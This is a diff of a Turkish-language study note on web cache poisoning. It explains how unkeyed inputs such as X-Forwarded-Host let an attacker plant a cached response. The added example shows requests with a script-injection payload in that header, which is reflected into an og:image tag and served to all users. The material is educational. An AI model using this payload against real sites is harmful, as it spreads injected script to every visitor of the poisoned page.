@@ -62,7 +62,7 @@ Cache key, sadece belirli alanları hesaba katar. Ama  response içeriği, key d
 ```
 X-Forwarded-For 
 ```
-uygulama response’u buna göre kişiselleştirir, ama cache key’e dahil edilmezse → cache zehirlenir.
+uygulama response’u buna göre kişiselleştirir, ama cache key'e dahil edilmezse → cache zehirlenir.
 
 ```
 User-Agent 
@@ -78,3 +78,41 @@ Bazı parametreler response’u etkiler ama cache key normalleştirmede göz ard
 Response cookie’ye göre değişir ama cache bunu ayırt etmez.
 
 Eğer response’u etkileyen bir input cache key’e dahil edilmemişse, saldırgan bu input’u kullanarak cache’i zehirleyebilir. Saldırgan unkeyed input ile zararlı response üretir.mCache bu response’u yanlışlıkla tüm kullanıcılar için geçerliymiş gibi saklar. Normal kullanıcı cache’den zehirli response’u alır.
+
+## Örnek Senaryo
+İlk Request:
+```
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: innocent-website.co.uk
+```
+
+İlk Response
+```
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
+```
+
+- Burada X-Forwarded-Host header'ı, og:image URL’sini dinamik olarak oluşturuyor.
+- Cache-Control public  proxy/CDN cache’leyebilir.
+- Cache key muhtemelen sadece Host + Path + Query’den oluşuyor, yani X-Forwarded-Host dahil değil unkeyed input.
+
+İkinci Request (Poisoned):
+```
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: a."><script>alert(1)</script>"
+```
+
+Response:
+```
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
+```
+
+- Burada XSS payload’u Open Graph URL’sine enjekte edildi.
+- Cache key aynı (çünkü X-Forwarded-Host cache key’e dahil değil).
+- Cache bunu saklar ve artık tüm kullanıcılar /en?region=uk çağırdığında zehirlenmiş response alır.
+
